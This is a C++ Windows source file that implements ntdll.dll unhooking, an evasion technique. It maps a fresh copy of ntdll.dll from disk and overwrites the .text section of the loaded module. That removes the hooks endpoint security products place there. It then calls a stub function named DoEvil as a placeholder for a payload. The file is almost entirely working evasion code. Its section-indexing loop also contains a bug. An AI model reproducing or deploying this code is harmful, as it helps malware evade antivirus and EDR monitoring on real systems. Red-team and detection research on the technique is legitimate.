#include <windows.h>
#include <iostream>

void DoEvil() {
	return;
}

static int Unhook() {
	HANDLE pollutedNtdll;
	HANDLE hFile;
	HANDLE hFileMapping;
	LPVOID hMapping;

	//get handle of pollutted ntdll.dll

	LPCSTR Ntdll = "ntdll.dll";
	pollutedNtdll = GetModuleHandleA(Ntdll);

	LPCSTR NtdllPath = "c:\\windows\\system32\\ntdll.dll";
	
	// open fresh copy of ntdll.dll and map a view of it

	hFile = CreateFileA(NtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return -1;
	}

	hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (!hFileMapping) {
		CloseHandle(hFile);
		return -1;
	}

	hMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!hMapping) {
		CloseHandle(hFile);
		CloseHandle(hFileMapping);
		return -1;
	}

	// find .text section of ntdll

	IMAGE_DOS_HEADER * hImgDosHeader = (IMAGE_DOS_HEADER * )hMapping;
	IMAGE_NT_HEADERS* hImgNtHeaders = (IMAGE_NT_HEADERS*)((DWORD_PTR)hMapping + hImgDosHeader->e_lfanew);
	IMAGE_FILE_HEADER hImgFileHeader = (IMAGE_FILE_HEADER)(hImgNtHeaders->FileHeader);
	IMAGE_SECTION_HEADER* hImgSecHeader = (IMAGE_SECTION_HEADER*)((size_t)hImgNtHeaders + sizeof(*hImgNtHeaders));
	DWORD oldprotect = 0;

	for (int i = 0; i < hImgFileHeader.NumberOfSections; i++) {
		if (!strcmp((char*)hImgSecHeader[i].Name, ".text")) {
			VirtualProtect((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				hImgSecHeader->Misc.VirtualSize,
				PAGE_EXECUTE_READWRITE,
				&oldprotect);
			if (!oldprotect) {
				return -1;
			}
			memcpy((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				(LPVOID)((DWORD_PTR)hMapping + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				hImgSecHeader->Misc.VirtualSize);
			VirtualProtect((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				hImgSecHeader->Misc.VirtualSize,
				oldprotect,
				&oldprotect);
			if (!oldprotect) {
				return -1;
			}
			return 0;
		}
	}
	return -1;
}

int main() {
	if (!Unhook()) {
		std::cout << "ntdll unhooked!" << std::endl;
		DoEvil();
	}
	return 0;
}
